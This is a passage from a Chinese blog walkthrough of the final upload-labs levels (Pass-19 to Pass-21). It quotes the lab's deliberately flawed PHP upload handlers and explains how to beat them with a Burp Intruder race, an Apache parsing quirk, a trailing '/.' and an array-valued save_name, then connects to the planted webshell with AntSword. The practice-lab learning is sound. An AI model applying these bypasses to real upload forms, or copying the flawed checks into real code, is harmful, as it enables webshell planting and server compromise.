<psw>软柿子</psw>，将他注释掉，这样就没办法识别他了。就你了，<kbd>.ppt</kbd>，在该句前加一个 <kbd>#</kbd> 即可。</p><img src="https://bu.dusays.com/2022/05/22/628a5601f30d6.webp" alt="" style="zoom: 75%;" /><blockquote><p>后文将看到，还是 <kbd>.7z</kbd> 更好用，虽然文件中有他的配置，实测表示并不影响，即不取消注释也可以。</p></blockquote></li><li><p>构造一个木马 <kbd>.ppt</kbd> 文件，在原木马文件后直接添加后缀 <kbd>.ppt</kbd> 即可，注意务必保留 <kbd>.php</kbd>，否则无法利用漏洞。</p><img src="https://bu.dusays.com/2022/05/22/628a56034f1d5.webp" alt="" style="zoom: 75%;" /></li><li><p>在 <kbd>Burp Suite</kbd> 中打开靶机，上传文件，抓包后发送至 <kbd>Intruder</kbd>，具体步骤与 Pass-18 中相同，这里稍加概括，<kbd>Clear &#36;</kbd> 后设置 <kbd>Payloads</kbd> 为 <kbd>Null payloads</kbd>，并选择 <kbd>Continue indefinitely</kbd> 以无限重发，最后在 <kbd>Resource Pool</kbd> 中设置适当的最大并发请求数 <kbd>Maximum concurrent requests</kbd> 即可 <kbd>Start attack</kbd> .</p><img src="https://bu.dusays.com/2022/05/22/628a5604d070d.webp" alt="" style="zoom: 75%;" /></li><li><p>依旧利用 Pass-18 中使用的 Python 程序访问文件。修改路径指向上传文件即可，值得注意的是，本关的上传路径应该存在 Bug 目前作者未修改。上传一张合法图片，打开图片查看路径即可发现文件被保存在了靶机根目录，且原 <kbd>upload</kbd> 目录名被加在了文件重命名的数字序列前面，由此可判断应该是构造上传路径时少了一个 <kbd>/</kbd>，这里不作修正，了解即可。</p><img src="https://bu.dusays.com/2022/05/22/628a5606928ed.webp" alt="" style="zoom: 75%;" /><p>因此访问所上传的文件的 URL 应为 <code>[靶机地址]/upload[文件名]</code>。</p></li><li><p>两边一同运行，力图植入木马，但是这次就不这么顺利了，Python 程序一直在运行中：</p><img src="https://bu.dusays.com/2022/05/22/628a5608177c1.webp" alt="" style="zoom: 75%;" /></li><li><p>修改代码，加入下面语句，即输出访问返回的状态码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(html.status_code)</span><br></pre></td></tr></table></figure><p>在输出窗口可以看到，访问文件一直返回的是 <kbd>500</kbd>，即服务器错误。但是在 <kbd>Burp Suite</kbd> 不断发包的过程中，是可以看到上传文件在闪动的，也就是说，文件存在，但是无法访问。</p><img src="https://bu.dusays.com/2022/05/22/628a56098a392.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="问题探究-3">问题探究</h3><ul><li><p>我们在靶机目录中放入木马文件与修改后的伪 <kbd>.ppt</kbd> 文件，在浏览器中访问他们。</p><img src="https://bu.dusays.com/2022/05/22/628a560e1d02e.webp" alt="" style="zoom: 75%;" /><p>木马文件正常访问，但是 <kbd>.ppt</kbd> 文件始终会报 500 服务器错误，因此，该文件并没有被解析为 PHP 文件，也就是漏洞不成立：</p><img src="https://bu.dusays.com/2022/05/22/628a560c59dd7.webp" alt="" style="zoom: 75%;" /><img src="https://bu.dusays.com/2022/05/22/628a561081387.webp" alt="" style="zoom: 75%;" /></li><li><p>我在 <a href="https://blog.51cto.com/u_15127661/4081404">这篇文章</a> 中寻找到了答案，也就是说，靶机环境应使用 <kbd>module</kbd> 方式连接 PHP 与 Apache。关于不同方式的介绍，可以参考 <a href="https://www.lirongyaoper.com/phpxiangguan/41.html">这篇文章</a>。说到这里，就应该注意到，其实作者在环境配置要求中就有提到这个：</p><img src="https://bu.dusays.com/2022/05/22/628a56161f0dc.webp" alt="" style="zoom: 75%;" /></li><li><p>那么具体应该如何配置呢，在 <a href="https://www.php.net/manual/zh/install.windows.apache2.php">官方文档</a> 中其实就有，不过并不叫 <kbd>module</kbd> 方式，而是 <kbd>Apache handler</kbd> 方式：</p><img src="https://bu.dusays.com/2022/05/22/628a5619bab37.webp" alt="" style="zoom: 75%;" /><p>参考文档中完成配置，其中两个路径都要修改为本地的路径，由于我自行下载配置的 PHP5 版本不包含 <kbd>php5apache2_4.dll</kbd> 文件，因此配置使用的是 <kbd>php5apache2_2.dll</kbd>，仅供参考：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LoadModule php5_module &quot;D:/phpstudy_pro/Extensions/php/php-5.2.10-Win32/php5apache2_2.dll&quot;</span><br><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">PHPIniDir &quot;D:/phpstudy_pro/Extensions/php/php-5.2.10-Win32&quot;</span><br></pre></td></tr></table></figure></li><li><p>重启 Apache 即可更新配置，但是……</p><img src="https://bu.dusays.com/2022/05/22/628a56123ea68.webp" alt="" style="zoom: 75%;" /><p>很遗憾，报错了，那段十六进制字符串翻译成中文的意思是，不是有效的 win32 程序，也就是说，这个 <kbd>php5apache2_2.dll</kbd> 并不能供我们使用。只是说不是有效的 win32 程序的话，就应该是 Apache 和 PHP 版本并不匹配的问题吧，虽说理论上高版本应该兼容低版本才对。</p></li><li><p>本地靶机使用的 Apache 版本为 <kbd>2.4.39</kbd>，不算旧，那就更新 PHP 的版本，当然这基于高版本 Apache 依然存在该漏洞的前提下。Windows 的各版本的包可以在 <a href="https://windows.php.net/downloads/releases/archives/">官方存档</a> 中找到，这里有从 PHP <kbd>5.2.10</kbd> 以后几乎全部的包，由于我的本地其他组件均使用 64 位版本的，因此这次 PHP 有必要使用 64 位版本，这里选择 <kbd>5.5.20</kbd> 版本，其中 <code>520</code> 致我的爱情！包中应含有 <kbd>php5apache2_4.dll</kbd> 文件，其中 <kbd>2_4</kbd> 对应于 Apache 的版本，实测 <kbd>nts</kbd> 版本（即非线程安全）的包中是不含该文件的。</p><img src="https://bu.dusays.com/2022/05/22/628a56142641f.webp" alt="" style="zoom: 75%;" /></li><li><p>下载好后解压到相应文件夹中 <kbd>PhpStudy</kbd> 就会自动检测到，可参考 Pass-16 完成初始的扩展路径配置。值得注意的是，在这个版本中针对 Windows 的扩展路径是提供快捷配置的，只需将对应注释去点即可（其实就是使用相对路径）：</p><img src="https://bu.dusays.com/2022/05/22/628a561ba8698.webp" alt="" style="zoom: 75%;" /></li><li><p>然后我们再次修改 Apache 的配置文件 <kbd>httpd.conf</kbd> 将路径指向新配置的 PHP 中，这里路径仅供参考：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LoadModule php5_module &quot;D:/phpstudy_pro/Extensions/php/php-5.5.20-Win32-VC11-x64/php5apache2_4.dll&quot;</span><br><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">PHPIniDir &quot;D:/phpstudy_pro/Extensions/php/php-5.5.20-Win32-VC11-x64&quot;</span><br></pre></td></tr></table></figure><p>启动 Apache，成功，也就是说已经完成了将 PHP 与 Apache 以 <kbd>module</kbd> 方式连接。</p></li><li><p>但是，再次访问测试用的文件时，依然是 500 服务器错误😅</p><img src="https://bu.dusays.com/2022/05/22/628a5617ce07b.webp" alt="" style="zoom: 75%;" /><p>将文件重命名为 <kbd>h-t-m-2.h-t-m</kbd>再测试一遍，浏览器将会显示出木马内容，而再重命名为 <kbd>h-t-m-2.php.h-t-m</kbd> 则依然显示 500 服务器错误。也就是说，对于后缀 <kbd>.h-t-m</kbd> 的文件会因为无法识别而被解析为普通文本，而添加 <kbd>.php.</kbd> 之后则会因为解析漏洞而检测到 <kbd>.php</kbd> 后缀，而经过测试，<kbd>.php</kbd> 文件是可以正常执行的，因此本次是添加未知后缀并引起向前解析后缀导致了 500 服务器错误。此外，这里不使用 <kbd>.ppt</kbd> 文件作测试是因为 Windows 系统对该文件过于敏感，频繁报毒，因此非常后悔选择这个后缀，建议优先选择 <kbd>.7z</kbd>，后文也将更换为该格式进行实操。</p></li><li><p>因此我们可以查看关于 <kbd>.php</kbd> 文件的执行方式，关于这一点，其实在配置 <kbd>module</kbd> 方式时就有过相关配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>就是上面这段，表示匹配到 <kbd>.php</kbd> 后缀时使用 <kbd>x-httpd-php</kbd> 运行该文件，即执行 PHP 脚本。但是，值得注意的是，最后的字符 <kbd>&#36;</kbd> 表示的是尾部匹配，即 <kbd>.php</kbd> 后不应有任何字符，这也就是为什么正常的 <kbd>.php</kbd> 文件可以正常解析而 <kbd>.php.h-t-m</kbd> 文件则无法解析。事实证明 Apache 默认配置也是这种匹配方式，而解决这个问题的方法就是将 <kbd>&#36;</kbd> 删去即可，这样才能与本关的漏洞匹配！</p></li><li><p>继续在浏览器中打开伪装木马文件，没有任何反应，同时文件所在木马生成了通过该文件生成的木马文件！成功了！</p><img src="https://bu.dusays.com/2022/05/22/628a561e5f2d3.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="再次突破-2">再次突破</h3><ul><li><p>删除用于测试的文件后，再次尝试入侵，在 <kbd>Burp Suite</kbd> 中再次重发包同时 Python 程序运行，再一次，Nice!</p><img src="https://bu.dusays.com/2022/05/22/628a561d2b0d0.webp" alt="" style="zoom: 75%;" /></li><li><p>不过实测有很大概率在 Python 完成 Nice! 之后并没有木马成功植入，而在浏览器中则会返回如下错误：</p><img src="https://bu.dusays.com/2022/05/22/628a56218e85e.webp" alt="" style="zoom: 75%;" /><p>文件流打开错误，文件突然找不到了，虽然返回的依然是 <strong>200</strong> 成功。其实可以理解为锁定文件后还没执行代码文件就已经被删除了，可能是来不及？具体原因暂时无法解答，但一种可行的解决方案是在重发包期间多访问几次，将 Python 代码中的 <kbd>break</kbd> 去掉然后手动适时关闭程序即可，或者手动修改代码定义循环次数。</p></li><li><p>最后在根目录就会出现间接植入的木马文件：</p><img src="https://bu.dusays.com/2022/05/22/628a561fc208b.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-18">夺旗</h3><ul><li><p>蚁剑连接，连接到最终植入的木马文件：</p><img src="https://bu.dusays.com/2022/05/22/628a56235818f.webp" alt="" style="zoom: 75%;" /></li><li><p>依旧本地无旗，继续看个视频。</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=679070797&bvid=BV1vm4y1d7Pd&cid=509970027&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen="allowfullscreen" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe></div></li></ul><h2 id="Pass-20">Pass-20</h2><h3 id="启动靶机-30">启动靶机</h3><ul><li><p>最后两关！</p><img src="https://bu.dusays.com/2022/05/23/628b362bac76b.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究页面-14">研究页面</h3><ul><li><p>最后两关都添加了保存名称的功能，即我们可以自定义文件上传后的名称。查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line">        <span class="comment">// 获取后缀名</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="comment">// 与黑名单进行匹配</span></span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难看出本关使用的是黑名单，并且没有之前关卡的层层过滤，只是简单的匹配不到后缀名后即可成功上传。因此本关的解法就有非常多了，包括但不限于之前所使用过的大小写绕过、加点绕过和 <kbd>%00</kbd> 绕过等。</p></li><li><p>与往常一样，本关不会采用已经使用过的方法。本关可以利用 <kbd>move_uploaded_file</kbd> 函数的另外一个特性，即忽略文件末尾的 <kbd>/.</kbd>。</p></li></ul><h3 id="突破限制-21">突破限制</h3><ul><li><p>直接在文件名末尾加上 <kbd>/.</kbd>，当然本地文件如何命名已经无所谓了，毕竟上传之后文件名是啥是由我们自己决定的。</p><img src="https://bu.dusays.com/2022/05/23/628b362cb20b3.webp" alt="" style="zoom: 75%;" /></li><li><p>然后就上传成功了。</p></li></ul><h3 id="夺旗-19">夺旗</h3><ul><li><p>蚁剑连接，当然连接 <kbd>.php</kbd> 后缀木马即可，毕竟 <kbd>/.</kbd> 已经被忽略了。</p><img src="https://bu.dusays.com/2022/05/23/628b362fc49e8.webp" alt="" style="zoom: 75%;" /></li><li><p>依旧本地无旗，继续看个视频。</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=937308823&bvid=BV1BT4y1U79r&cid=552445110&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen="allowfullscreen" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe></div></li></ul><h2 id="Pass-21">Pass-21</h2><h3 id="启动靶机-31">启动靶机</h3><ul><li><p>最后一关！</p><img src="https://bu.dusays.com/2022/05/23/628b3631ed3ee.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究页面-15">研究页面</h3><ul><li><p>直接查看源码，最后一关慢慢审计。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>首先定义了 MIME 白名单，通过 <kbd>&#36;_FILES&#91;'upload_file'&#93;&#91;'type'&#93;</kbd> 获取文件 MIME 类型并与白名单比对，若匹配失败则『禁止上传』：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>MIME 匹配成功之后就开始检查文件名，首先通过 <kbd>empty(&#36;&#95;POST[save_name])</kbd> 判断用户是否指定了文件名，若未指定则以上传文件的初始文件名来命名，即 <kbd>&#36;&#95;FILES&#91;'upload_file'&#93;&#91;'name'&#93;</kbd>，若指定了则使用指定文件名进行命名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br></pre></td></tr></table></figure></li><li><p>然后判断文件名是否为数组，若非数组则通过 <kbd>explode()</kbd> 函数将文件名分隔为数组，分隔字符为 <kbd>.</kbd>，同时通过 <kbd>strtolower()</kbd> 函数将所有字母小写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line"><span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>接着使用 <kbd>end()</kbd> 函数取文件名数组的最后一个元素，也就是后缀名，与定义好的后缀名白名单进行比对，若匹配失败，则『禁止上传』：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>接下来就是文件名的最终确定，首先通过 <kbd>reset()</kbd> 函数获取数组中的第一个元素并与 <kbd>&#36;file[count(&#36;file) - 1]</kbd> 函数返回的元素以点相连接成为最终的文件名。其中 <kbd>count()</kbd> 返回数组的元素数量，也就是说，<kbd>&#36;file[count(&#36;file) - 1]</kbd> 原则上获取到的就是后缀名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure></li><li><p>最后一段代码就是例行的标准上传动作：获取路径并将临时文件移入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以发现，最终文件命名将只保留数组首末元素，而如果传入的文件名本身就是一个数组，则 <kbd>explode()</kbd> 函数将不起作用。这时就可以定制数组的内容！注意最终文件名的合成，使用的是 <kbd>&#36;file[count(&#36;file) - 1]</kbd> 而不是 <kbd>end()</kbd> 函数，而 <kbd>count()</kbd> 返回元素数量并不包括数组中的空元素。也就是说，如果数组中包含空元素，最终合成的后缀名就可以定制，且只需保证数组末元素为合法后缀名即可成功上传！</p></li></ul><h3 id="突破限制-22">突破限制</h3><ul><li><p>要将文件名构造成数组，就需要抓包了，因此，打开 <kbd>Burp Suite</kbd> 抓包！由于有 MIME 检查，因此原文件名应伪装为合法图片文件。图示位置即上传时所指定的文件名及初始文件名：</p><img src="https://bu.dusays.com/2022/05/23/628b362ea7d8c.webp" alt="" style="zoom: 75%;" /></li><li><p>要将其修改为数组，实际上在 <kbd>save_name</kbd> 变量名后加上 <kbd>[0]</kbd> 即可，其中 <kbd>0</kbd> 表示数组第一个元素，同样后续元素定义则使用 <kbd>save_name[x]</kbd> 其中 <kbd>x</kbd> 为对应索引。当然，后续元素的其他格式均与首元素一样，因此复制粘贴即可：</p><img src="https://bu.dusays.com/2022/05/23/628b362dac620.webp" alt="" style="zoom: 75%;" /><p>值得注意的是，这里并没有定义 <kbd>save_name[1]</kbd> 而是直接定义了 <kbd>save_name[2]</kbd> 为合法数组，这样就在数组中留下了一个空元素，最后 <kbd>&#36;file[count(&#36;file) - 1]</kbd> 就会访问到空元素而导致最终文件名为首元素加点（数组只有两个元素，<kbd>count()</kbd> 函数返回 <strong>2</strong> ），即 <kbd>h-t-m.php.</kbd>。由于末尾的点不解析，因此实际上我们就已经完成了木马的植入了！</p></li><li><p>发包之后即可看到文件上传成功。</p><img src="https://bu.dusays.com/2022/05/23/628b3630e7cc0.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-20">夺旗</h3><ul><li><p>蚁剑连接，实测尾部可以带点，会自动忽略。</p><img src="https://bu.dusays.com/2022/05/23/628b362b8715d.webp" alt="" style="zoom: 75%;" /></li><li><p>依旧本地无旗，最后看个视频。</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=424900400&bvid=BV1s3411s7ET&cid=553050440&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen="allowfullscreen" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe></div></li></ul><h2 id="写在后面">写在后面</h2><p>  本来只是想开一篇博文记录通关过程，没想到通关之后已经写了两万多字了。在本文开篇，我甚至不懂文件上传是什么概念，没用过蚁剑，也没用过Burp Suite，一切都是从0开始。在此期间，我不断穿梭在各大搜索引擎之间，很多时候，我的浏览器都是这个样子的：</p><img src="https://bu.dusays.com/2022/05/23/628b61c93ea6f.webp" alt="" style="zoom: 75%;" /><p>  